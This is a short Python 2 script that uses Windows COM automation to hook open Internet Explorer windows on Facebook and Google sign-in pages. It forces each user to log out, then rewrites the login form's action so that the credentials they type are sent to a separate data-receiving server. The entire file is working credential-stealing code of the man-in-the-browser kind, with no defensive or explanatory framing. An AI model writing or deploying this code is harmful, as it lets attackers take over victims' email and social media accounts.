import win32com.client
import time
import urlparse
import urllib

data_receiver = "http://localhost:8089/"

target_sites = {}
target_sites["www.facebook.com"] = {"logout_url":None,
                                    "logout_form":"logout_forum",
                                    "login_form_index":0,
                                    "owned":False}

target_sites["accounts.google.com"] = {"logout_url":"https://accounts.google.com/Logout?hl\x3dzh-TW\x26amp",
                                       "logout_form":None,
                                       "login_form_index":0,
                                       "owned":False}
target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}' #IE explorer

windows = win32com.client.Dispatch(clsid)


def wait_for_browser(browser):
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return


while True:
    time.sleep(1)
    for browser in windows:
        url = urlparse.urlparse(browser.LocationUrl)

        if url.hostname in target_sites:
            if target_sites[url.hostname]["owned"]:
                continue

            if target_sites[url.hostname]["logout_url"]:
        
                browser.Navigate(target_sites[url.hostname]["logout_url"])
                wait_for_browser(browser)

            else:
                print "else"
                full_doc = browser.Document.all
                for i in full_doc:
                    try:
                        if i.id == target_sites[url.hostname]["logout_form"]:
                            print i.id
                            i.submit()
                            wait_for_browser(browser)

                    except:
                        pass

            try:
                print "login_form_index"
                login_index = target_sites[url.hostname]["login_form_index"]
                login_page = urllib.quote(browser.LocationUrl)
                browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
                print browser.Document.forms[login_index].action
                #browser.Document.forms[login_index].action("%s%s" % (data_receiver, login_page))
                target_sites[url.hostname]["owned"] = True
            except:
                pass
